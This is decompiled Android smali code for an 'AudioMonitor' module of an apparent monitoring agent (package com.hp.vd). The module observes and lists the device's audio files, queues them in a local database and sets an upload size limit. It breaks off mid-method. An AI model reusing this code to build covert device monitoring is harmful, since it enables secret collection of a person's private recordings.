.class public Lcom/hp/vd/module/monitor/AudioMonitor;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "AudioMonitor.java"


# static fields
.field public static final ATTRIBUTE_FIRST_RUN:Ljava/lang/String; = "first_run"

.field public static final ATTRIBUTE_MAX_FILE_UPLOAD_SIZE:Ljava/lang/String; = "max_file_upload_size"

.field public static final CUSTOM_ATTRIB_LIST_ON_START:Ljava/lang/String; = "gather_audio_on_start"

.field public static final CUSTOM_ATTRIB_MAX_ID:Ljava/lang/String; = "max_internal_audio_id"

.field protected static final TAG:Ljava/lang/String; = "AudioMonitor"


# instance fields
.field protected audioObserver:Lcom/hp/vd/module/monitor/audio/AudioObserver;

.field protected buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/AudioData;",
            ">;"
        }
    .end annotation
.end field

.field protected contentResolver:Landroid/content/ContentResolver;

.field protected contentUri:Landroid/net/Uri;

.field protected initialAudioListerThread:Ljava/lang/Thread;

.field protected moduleDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected monitoringStatus:Z

.field protected writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/QueueConsumerDao<",
            "Lcom/hp/vd/data/AudioData;",
            ">;"
        }
    .end annotation
.end field

.field protected writerThread:Ljava/lang/Thread;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 37
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    const/4 v0, 0x0

    .line 46
    iput-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 47
    iput-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    .line 48
    iput-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->writerThread:Ljava/lang/Thread;

    .line 49
    iput-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->initialAudioListerThread:Ljava/lang/Thread;

    .line 51
    iput-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->audioObserver:Lcom/hp/vd/module/monitor/audio/AudioObserver;

    .line 52
    iput-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 54
    iput-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->contentResolver:Landroid/content/ContentResolver;

    .line 55
    iput-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->contentUri:Landroid/net/Uri;

    const/4 v0, 0x0

    .line 57
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->monitoringStatus:Z

    return-void
.end method


# virtual methods
.method public deinitialize()Z
    .locals 1

    const/4 v0, 0x0

    .line 317
    iput-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->contentUri:Landroid/net/Uri;

    .line 318
    iput-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->contentResolver:Landroid/content/ContentResolver;

    .line 320
    iput-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 321
    iput-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    .line 323
    iput-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const/4 v0, 0x1

    return v0
.end method

.method public getDataClass()Ljava/lang/Class;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation

    .line 63
    const-class v0, Lcom/hp/vd/data/AudioData;

    return-object v0
.end method

.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 68
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "monitor"

    .line 70
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 71
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 72
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 73
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/AudioMonitor;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x3

    .line 74
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v3.0"

    .line 75
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "data"

    const-string v2, "file"

    .line 77
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "max_internal_audio_id"

    const-string v2, "0"

    .line 81
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "gather_audio_on_start"

    const-string v2, "true"

    .line 82
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "max_file_upload_size"

    const-string v2, "33554432"

    .line 83
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "first_run"

    const-string v2, "true"

    .line 84
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const/16 v1, 0xcb

    .line 86
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    .line 87
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    .line 89
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "AudioMonitor"

    return-object v0
.end method

.method public initialize()Z
    .locals 7

    .line 198
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/AudioMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 204
    sget-object v1, Landroid/provider/MediaStore$Audio$Media;->EXTERNAL_CONTENT_URI:Landroid/net/Uri;

    iput-object v1, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->contentUri:Landroid/net/Uri;

    .line 205
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/AudioMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v1

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->contentResolver:Landroid/content/ContentResolver;

    const/4 v1, 0x0

    .line 212
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/AudioMonitor;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 220
    iget-object v2, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "first_run"

    invoke-virtual {v2, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    const-string v3, "true"

    invoke-virtual {v2, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_2

    .line 221
    iget-object v2, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "first_run"

    const-string v4, "false"

    invoke-virtual {v2, v3, v4}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v2, "AudioMonitor"

    const-string v3, "ATTRIBUTE_FIRST_RUN == true. Trying to load the temporarily saved values."

    .line 223
    invoke-interface {v0, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 225
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/AudioMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v2

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "system"

    .line 227
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/AudioMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v4

    invoke-virtual {v4}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    .line 225
    invoke-virtual {v2, v3, v1}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    const-string v3, "audio_max_internal_audio_id"

    .line 230
    invoke-interface {v2, v3}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_0

    const-string v3, "audio_max_internal_audio_id"

    const-string v4, "0"

    .line 231
    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 232
    iget-object v4, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v5, "max_internal_audio_id"

    invoke-virtual {v4, v5, v3}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v4, "AudioMonitor"

    .line 234
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "Loaded (after update) CUSTOM_ATTRIB_MAX_ID: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v4, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_0
    const-string v3, "audio_gather_audio_on_start"

    .line 237
    invoke-interface {v2, v3}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_1

    const-string v3, "audio_gather_audio_on_start"

    const-string v4, "true"

    .line 238
    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 239
    iget-object v3, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v4, "gather_audio_on_start"

    invoke-virtual {v3, v4, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v3, "AudioMonitor"

    .line 241
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Loaded (after update) CUSTOM_ATTRIB_LIST_ON_START: "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-interface {v0, v3, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 244
    :cond_1
    iget-object v2, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-virtual {p0, v2}, Lcom/hp/vd/module/monitor/AudioMonitor;->updateModuleData(Lcom/hp/vd/data/ModuleData;)Z

    move-result v2

    if-nez v2, :cond_2

    const-string v2, "AudioMonitor"

    const-string v3, "Could not persist ATTRIBUTE_FIRST_RUN = FALSE."

    const/4 v4, 0x3

    .line 245
    invoke-interface {v0, v2, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    :cond_2
    const-string v2, "AudioMonitor"

    .line 270
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "initialize(): max_internal_audio_id = "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v5, "max_internal_audio_id"

    invoke-virtual {v4, v5}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    const-string v2, "AudioMonitor"

    .line 271
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "initialize(): gather_audio_on_start = "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v5, "gather_audio_on_start"

    invoke-virtual {v4, v5}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-interface {v0, v2, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v2

    const-string v3, "AudioMonitor"

    const-string v4, "initialize(): could not load persisted module data."

    .line 274
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 276
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/AudioMonitor;->getModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 285
    :goto_0
    new-instance v2, Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v2}, Lcom/hp/vd/data/concurrency/BlockingQueue;-><init>()V

    iput-object v2, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    const/4 v2, 0x0

    .line 290
    :try_start_1
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/AudioMonitor;->getDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v3
    :try_end_1
    .catch Ljava/sql/SQLException; {:try_start_1 .. :try_end_1} :catch_1

    move-object v2, v3

    goto :goto_1

    :catch_1
    move-exception v3

    const-string v4, "AudioMonitor"

    const-string v5, "initialize(): could not initialize dao."

    .line 293
    invoke-interface {v0, v4, v5, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 296
    :goto_1
    new-instance v3, Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v3, v4, v2, v0}, Lcom/hp/vd/data/concurrency/QueueConsumerDao;-><init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v3, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    .line 299
    :try_start_2
    iget-object v2, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v2}, Lcom/hp/vd/context/Context;->getHelper()Lcom/hp/vd/data/persistency/DatabaseHelper;

    move-result-object v2

    invoke-virtual {v2}, Lcom/hp/vd/data/persistency/DatabaseHelper;->getModuleDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v2

    iput-object v2, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->moduleDao:Lcom/j256/ormlite/dao/Dao;
    :try_end_2
    .catch Ljava/sql/SQLException; {:try_start_2 .. :try_end_2} :catch_2

    const/4 v0, 0x1

    return v0

    :catch_2
    move-exception v2

    const-string v3, "AudioMonitor"

    const-string v4, "initialize(): cannot get moduleDao."

    .line 302
    invoke-interface {v0, v3, v4, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v1
.end method

.method public install(Ljava/lang/String;)Z
    .locals 3

    .line 97
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/AudioMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "AudioMonitor"

    const-string v2, "install() called."

    .line 98
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 100
    invoke-super {p0, p1}, Lcom/hp/vd/module/ModuleAbstract;->install(Ljava/lang/String;)Z

    move-result p1

    if-nez p1, :cond_0

    const/4 p1, 0x0

    return p1

    :cond_0
    const/16 p1, 0x4b

    .line 104
    invoke-static {p1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object p1

    invoke-virtual {p0, p1}, Lcom/hp/vd/module/monitor/AudioMonitor;->setDataReadLimit(Ljava/lang/Integer;)Z

    const/4 p1, 0x1

    return p1
.end method

.method public isStarted()Z
    .locals 1

    .line 420
    iget-boolean v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->monitoringStatus:Z

    return v0
.end method

.method public start()Z
    .locals 11

    .line 331
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/AudioMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "AudioMonitor"

    const-string v2, "start(): called."

    .line 332
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 334
    iget-boolean v1, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->active:Z

    const/4 v2, 0x0

    if-nez v1, :cond_0

    const-string v1, "AudioMonitor"

    const-string v3, "This module is currently DEactivated."

    .line 335
    invoke-interface {v0, v1, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return v2

    .line 340
    :cond_0
    iget-object v1, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    if-nez v1, :cond_1

    const-string v1, "AudioMonitor"

    const-string v3, "start(): writer is NULL."

    const/4 v4, 0x3

    .line 341
    invoke-interface {v0, v1, v3, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    return v2

    .line 346
    :cond_1
    iget-object v1, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->writerThread:Ljava/lang/Thread;

    const/4 v9, 0x1

    if-eqz v1, :cond_2

    iget-object v1, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isAlive()Z

    move-result v1

    if-eqz v1, :cond_2

    iget-object v1, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isInterrupted()Z

    move-result v1

    if-ne v1, v9, :cond_3

    .line 347
    :cond_2
    new-instance v1, Ljava/lang/Thread;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    const-string v3, "Audio-Writer-Queue"

    invoke-direct {v1, v2, v3}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->writerThread:Ljava/lang/Thread;

    .line 348
    iget-object v1, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 351
    :cond_3
    iget-object v1, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->audioObserver:Lcom/hp/vd/module/monitor/audio/AudioObserver;

    if-nez v1, :cond_4

    .line 352
    new-instance v8, Lcom/hp/vd/module/monitor/audio/AudioObserver;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->contentResolver:Landroid/content/ContentResolver;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->contentUri:Landroid/net/Uri;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->dao:Lcom/j256/ormlite/dao/Dao;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    move-object v1, v8

    move-object v7, v0

    invoke-direct/range {v1 .. v7}, Lcom/hp/vd/module/monitor/audio/AudioObserver;-><init>(Landroid/content/ContentResolver;Landroid/net/Uri;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v8, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->audioObserver:Lcom/hp/vd/module/monitor/audio/AudioObserver;

    .line 362
    :cond_4
    iget-object v1, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v2, "gather_audio_on_start"

    invoke-virtual {v1, v2}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-ne v1, v9, :cond_6

    .line 364
    iget-object v1, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->initialAudioListerThread:Ljava/lang/Thread;

    if-eqz v1, :cond_5

    iget-object v1, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->initialAudioListerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isAlive()Z

    move-result v1

    if-nez v1, :cond_6

    .line 365
    :cond_5
    new-instance v10, Lcom/hp/vd/module/monitor/audio/AudioLister;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->contentResolver:Landroid/content/ContentResolver;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->contentUri:Landroid/net/Uri;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->dao:Lcom/j256/ormlite/dao/Dao;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->audioObserver:Lcom/hp/vd/module/monitor/audio/AudioObserver;

    iget-object v7, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    move-object v1, v10

    move-object v8, v0

    invoke-direct/range {v1 .. v8}, Lcom/hp/vd/module/monitor/audio/AudioLister;-><init>(Landroid/content/ContentResolver;Landroid/net/Uri;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/module/monitor/audio/AudioObserver;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    .line 375
    new-instance v1, Ljava/lang/Thread;

    const-string v2, "Initial-Audio-Lister-Thread"

    invoke-direct {v1, v10, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->initialAudioListerThread:Ljava/lang/Thread;

    .line 376
    iget-object v1, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->initialAudioListerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 380
    :cond_6
    iget-object v1, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->contentResolver:Landroid/content/ContentResolver;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->contentUri:Landroid/net/Uri;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->audioObserver:Lcom/hp/vd/module/monitor/audio/AudioObserver;

    invoke-virtual {v1, v2, v9, v3}, Landroid/content/ContentResolver;->registerContentObserver(Landroid/net/Uri;ZLandroid/database/ContentObserver;)V

    const-string v1, "AudioMonitor"

    const-string v2, "start(): Audio content observer was registered."

    .line 386
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 388
    iput-boolean v9, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->monitoringStatus:Z

    return v9
.end method

.method public stop()Z
    .locals 3

    .line 396
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/AudioMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "AudioMonitor"

    const-string v2, "stop(): called."

    .line 397
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 399
    iget-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->audioObserver:Lcom/hp/vd/module/monitor/audio/AudioObserver;

    if-eqz v0, :cond_0

    iget-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->contentResolver:Landroid/content/ContentResolver;

    if-eqz v0, :cond_0

    .line 400
    iget-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->contentResolver:Landroid/content/ContentResolver;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->audioObserver:Lcom/hp/vd/module/monitor/audio/AudioObserver;

    invoke-virtual {v0, v1}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V

    const/4 v0, 0x0

    .line 401
    iput-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->audioObserver:Lcom/hp/vd/module/monitor/audio/AudioObserver;

    .line 404
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/AudioMonitor;->writerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_1

    .line 405
